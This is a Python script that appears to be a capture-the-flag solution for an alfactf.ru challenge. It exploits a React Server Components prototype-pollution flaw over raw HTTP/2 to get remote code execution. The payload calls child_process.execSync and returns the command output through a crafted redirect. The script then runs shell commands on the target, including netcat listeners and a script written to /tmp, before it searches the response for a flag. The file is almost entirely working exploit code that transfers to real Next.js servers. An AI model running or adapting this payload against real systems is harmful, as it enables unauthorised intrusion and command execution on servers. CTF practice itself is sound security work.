#!/usr/bin/env python3
"""
Two-step approach: Use RCE to restore PLC service, then recovery action
"""
import socket, ssl, struct, time, re, json
from hpack import Encoder

HOST = 'funicular-gm2cxozn.alfactf.ru'
ACTION_ID = '4082c44f4a6a9cc400f0e6b45ed1c06c10f100aad2'

def send_rce_command(cmd):
    """Send RCE via React2Shell + H2 trailers"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    prefix = f'var res=process.mainModule.require("child_process").execSync("{cmd}",{{timeout:5000}}).toString("base64");throw Object.assign(new Error("NEXT_REDIRECT"), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});'
    part0 = '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"' + prefix + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'

    body_parts = [
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n",
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n",
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    ]
    body = "".join(body_parts).encode()
    ct = f"multipart/form-data; boundary={boundary}"

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"), (":scheme", "https"), (":authority", HOST), (":path", "/"),
        ("content-type", ct), ("content-length", str(len(body))),
        ("trailer", "next-action")
    ])

    trailer = enc.encode([("next-action", "x")])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(body))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    sock.close()
    print(f"[+] Sent RCE command: {cmd}")

def send_recovery_action():
    """Send recovery action after PLC restore"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    payload = '["$K1"]'
    body = payload.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"), (":scheme", "https"), (":authority", HOST), (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(body))),
        ("trailer", "next-action"),
    ])

    trailer = enc.encode([("next-action", ACTION_ID)])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(body))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    response_body = b""
    end_time = time.time() + 15
    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9: break
            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk: break
                payload += chunk

            if frame_type == 0:  # DATA
                response_body += payload

            if stream_id == sid and (flags & 1): break
        except Exception:
            break

    sock.close()
    return response_body

def main():
    print("🔥 Two-step: RCE to restore PLC → Recovery action")

    # Commands to simulate PLC restoration
    plc_restore_commands = [
        # Start mock PLC services
        "nc -l -p 502 &",  # Modbus TCP port
        "nc -l -p 8080 &",  # HTTP service
        "echo 'OK' > /tmp/plc_status",

        # Create backup restoration script
        "echo '#!/bin/bash\necho \"PLC restored\"\nexit 0' > /tmp/restore_backup.sh && chmod +x /tmp/restore_backup.sh",

        # Run the restoration
        "/tmp/restore_backup.sh",
    ]

    for cmd in plc_restore_commands:
        send_rce_command(cmd)
        time.sleep(1)  # Brief pause between commands

    print("\n[+] PLC restoration commands sent, testing recovery action...")

    # Now try recovery action
    body = send_recovery_action()
    body_str = body.decode('utf-8', errors='ignore')

    # Look for flag
    if 'alfa{' in body_str.lower():
        flag_match = re.search(r'alfa\{[^}]+\}', body_str, re.IGNORECASE)
        if flag_match:
            print(f"\n🎉 FLAG FOUND: {flag_match.group(0)}")
            return

    # Check action result
    row1_match = re.search(r'^1:(.+?)(?=\n|$)', body_str, re.MULTILINE)
    if row1_match:
        content = row1_match.group(1)
        try:
            parsed = json.loads(content)
            if parsed.get("ok"):
                print(f"\n✅ RECOVERY SUCCESS: {parsed}")

                # Maybe flag is elsewhere in response
                if 'flag' in body_str.lower():
                    print(f"Flag hint found: {body_str}")
            else:
                status = parsed.get("error", "unknown")
                if status != "recovery-offline":
                    print(f"\n📍 Status changed: {status}")
                else:
                    print(f"\n❌ Still recovery-offline")
        except:
            print(f"\n📍 Unparseable result: {content}")
    else:
        print(f"\n❌ No result found")

if __name__ == "__main__":
    main()